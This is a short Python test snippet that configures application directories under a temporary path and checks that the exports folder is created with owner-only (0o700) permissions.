    from app.config import AppSettings, ensure_directories

    settings = AppSettings(
        data_dir=tmp_path / "data",
        models_dir=tmp_path / "models",
        db_path=tmp_path / "data" / "results.duckdb",
        log_file=tmp_path / "logs" / "baseer.log",
    )
    ensure_directories(settings)
    assert (settings.data_dir / "exports").stat().st_mode & 0o777 == 0o700
